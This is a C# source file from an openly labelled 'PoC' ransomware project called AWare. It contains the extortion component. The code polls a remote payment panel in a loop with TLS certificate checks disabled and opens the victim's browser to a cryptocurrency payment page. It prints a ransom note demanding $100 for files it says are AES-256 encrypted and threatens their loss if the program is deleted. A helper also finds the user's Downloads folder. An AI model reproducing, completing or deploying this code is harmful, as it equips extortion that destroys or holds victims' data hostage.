using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace AWare.Helper
{
    public static class ConsoleHelper
    {
 
        internal static (string Log, bool Paid) PaymentStatus = ("You have not paid.", false);

        public static void AsciiHeader(string sessId)
        {      

            var monitoringNetwork = new Thread(() =>
            {

                while (true)
                {

                    try
                    {
                        var httpClient = new HttpClient(new HttpClientHandler()
                        {
                            ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
                        });

                        var responseString = httpClient.GetStringAsync($"{Globals.PanelLink}?MonitoringID={sessId}").Result;

                        PaymentStatus = responseString.Trim() switch
                        {
                            "charge:pending" => ("The payment has been made but not confirmed, please wait for 1 confirmation.", false),
                            "charge:created" => ("Order created, but not paid.", false),
                            "charge:confirmed" => ("Payment confirmed, entering the restoration process.", true),
                            _ => ("You have not paid.", false),
                        };


                    }
                    catch { continue; }                    
                    
                    Thread.Sleep(5000);
                }
            });

            monitoringNetwork.Start();

            if (!PaymentStatus.Paid)
            {
                OpenUrl($"{Globals.PanelLink}?sessid={sessId}");
            }                

            while (true)
            {
                Console.Clear();

                Console.CursorVisible = false;

                var asciiLog = new[]
{
"                   /\"\\",
"                  |\\./|",
"                  |   |   AWare - PoC Ransomware",
"                  |   |   Version : 1.0.0 ",
"                  |>~<|   Credits : github.com/biitez",
$"                  |   |   Session-ID : {sessId}",
$"                  |   |   Link where you must pay : {Globals.PanelLink}",
"                  |   |",
"               /'\\|   |/'\\..",
"           /~\\|   |   |   | \\   Your files are encrypted under advanced encryption (AES-256), You can only restore your files if you pay $100.",
"          |   =[@]=   |   |  \\ ",
$"          |   |   |   |   |   \\   You have been redirected to a page where you must complete a payment of $100 via CRYPTOCURRENCY",
"          | ~   ~   ~   ~ |`   )   in order to have your files back, if you do not make the payment, your files will be lost.",
"          |                   /",
$"           \\                 /   We are monitoring the network every 10 seconds searching any payment, don't close the program.",
"            \\               /   When your payment reached 1 confirmation, AWare automatically will decrypt all the files encrypted and will completely self-destruct.",
"             \\    _____    / ",
"              |--//''`\\--|  Be careful with the files you open from the internet.",
"              | (( +==)) |   ",
"              |--\\_|_//--|  What happens if you CLOSE AWare? : Nothing, when you open it it will still be waiting for your payment. (We do not recommend that you close it)",
"              |--\\_|_//--|  What happens if you DELETE AWare? : You will not be able to recover your files.",
"              |--\\_|_//--|	",
};

                Console.WriteLine(Environment.NewLine);

                foreach (var i in asciiLog)
                {

                    Console.WriteLine(i);
                }

                Thread.Sleep(5000);

                if (PaymentStatus.Paid)
                    break;
            }           
        }


        private static void OpenUrl(string url)
        {
            try
            {
                Process.Start(url);
            }
            catch
            {
                // hack because of this: https://github.com/dotnet/corefx/issues/10361
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    url = url.Replace("&", "^&");
                    Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    Process.Start("xdg-open", url);
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    Process.Start("open", url);
                }
                else
                {
                    throw;
                }
            }
        }


        private static Guid _folderDownloads = new Guid("374DE290-123F-4565-9164-39C4925E467B");


        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        private static extern int SHGetKnownFolderPath(ref Guid id, int flags, IntPtr token, out IntPtr path);

        public static string GetDownloadsPath()
        {
            if (Environment.OSVersion.Version.Major < 6) throw new NotSupportedException();

            var pathPtr = IntPtr.Zero;

            try
            {
                SHGetKnownFolderPath(ref _folderDownloads, 0, IntPtr.Zero, out pathPtr);
                return Marshal.PtrToStringUni(pathPtr);
            }
            finally
            {
                Marshal.FreeCoTaskMem(pathPtr);
            }
        }
    }
}
